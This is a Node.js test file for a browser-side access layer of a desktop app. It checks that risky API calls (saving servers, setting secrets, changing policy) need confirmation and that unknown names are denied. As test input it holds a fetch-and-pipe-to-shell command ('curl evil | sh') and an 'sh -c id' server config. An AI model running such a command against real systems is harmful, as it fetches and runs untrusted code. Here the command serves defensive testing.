// Zentrale in the browser (src/web.js, src/web-access.js, AURA-63): only what the browser UI needs; anything that
// runs commands, weakens rules or changes secrets needs a confirmation in the desktop app.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const { webAccess, describe, ALLOW, CONFIRM, DENY } = require('../src/web-access');

const SRC = path.join(__dirname, '..', 'src');
// All functions of the Zentrale API, taken from the Zentrale preload (the list the UI can call).
function apiNames() {
  const src = fs.readFileSync(path.join(SRC, 'preload-zentrale.js'), 'utf8');
  const list = /for \(const n of \[([^\]]+)\]/.exec(src)[1];
  const names = [...list.matchAll(/'(\w+)'/g)].map((m) => m[1]);
  for (const m of src.matchAll(/z\.(\w+) = \(/g)) names.push(m[1]);
  return names;
}

test('dangerous functions are never allowed without confirmation', () => {
  for (const n of ['saveServer', 'installRegistry', 'toggleServer', 'setPolicy', 'savePolicy', 'saveSkill', 'saveAgentsMd', 'setSecret', 'deleteSecret', 'installExtension']) {
    assert.strictEqual(webAccess(n), 'confirm', n);
  }
  for (const n of ['openPath', 'openWeb', 'unknownFunction', '__proto__', 'constructor', 'hasOwnProperty']) {
    assert.strictEqual(webAccess(n), 'deny', n);
  }
  for (const n of ['state', 'secrets', 'getServer', 'audit', 'resetWeb']) assert.strictEqual(webAccess(n), 'allow', n);
});

test('every Zentrale API function has exactly one decision', () => {
  const names = apiNames();
  assert.ok(names.length > 30, `only ${names.length} names`);
  for (const n of names) {
    const where = [ALLOW.has(n), Object.prototype.hasOwnProperty.call(CONFIRM, n), DENY.has(n)].filter(Boolean).length;
    assert.strictEqual(where, 1, `${n} is in ${where} lists`);
  }
  for (const n of [...ALLOW, ...Object.keys(CONFIRM), ...DENY]) assert.ok(names.includes(n), `${n} is not an API function`);
});

test('the confirmation shows what will run', () => {
  assert.match(describe('saveServer', { name: 'x', config: { command: 'bash', args: ['-c', 'curl evil | sh'] } }), /bash -c curl evil \| sh/);
  assert.match(describe('saveServer', { name: 'x', config: { url: 'https://mcp.example/sse' } }), /https:\/\/mcp\.example\/sse/);
  assert.ok(describe('saveServer', { name: 'x', config: { command: 'a'.repeat(1000) } }).length < 400);
  assert.match(describe('toggleServer', { name: 'x', enabled: true }), /startet/);
  assert.strictEqual(typeof describe('setSecret', undefined), 'string');
  assert.strictEqual(typeof describe('saveServer', null), 'string');
});

// End-to-end against the real HTTP server, with Electron and the Zentrale API stubbed.
test('web server: allow, confirm and deny', async (t) => {
  const Module = require('module');
  const calls = [];
  const API = {
    state: () => ({ ok: 1 }),
    saveServer: (a) => { calls.push(['saveServer', a.name]); return { saved: a.name }; },
    openPath: () => { calls.push(['openPath']); return true; }
  };
  const orig = Module._load;
  Module._load = function (req, ...rest) {
    if (req === 'electron') return { shell: { openExternal() {} }, dialog: {} };
    if (req === './zentrale') return { API };
    return orig.call(this, req, ...rest);
  };
  t.after(() => { Module._load = orig; });
  delete require.cache[require.resolve('../src/web')];
  const web = require('../src/web');
  t.after(() => web.stop());
  const asked = [];
  let answer = false;
  web.setConfirm(async (what) => { asked.push(what); return answer; });

  const url = new URL(await web.testUrl());
  const token = /t=([\w-]+)/.exec(url.hash)[1];
  const call = (name, arg) => fetch(`${url.origin}/api/${name}`, {
    method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + token }, body: JSON.stringify({ arg })
  }).then(async (r) => ({ status: r.status, body: await r.json() }));

  assert.deepStrictEqual(await call('state'), { status: 200, body: { result: { ok: 1 } } });
  assert.strictEqual((await call('openPath', 'mcp')).status, 403);

  const cfg = { name: 'evil', config: { command: 'sh', args: ['-c', 'id'] } };
  assert.strictEqual((await call('saveServer', cfg)).status, 403);
  answer = true;
  assert.deepStrictEqual(await call('saveServer', cfg), { status: 200, body: { result: { saved: 'evil' } } });
  assert.strictEqual(asked.length, 2);
  assert.match(asked[0], /sh -c id/);
  assert.deepStrictEqual(calls, [['saveServer', 'evil']]); // openPath and the declined save never ran
});
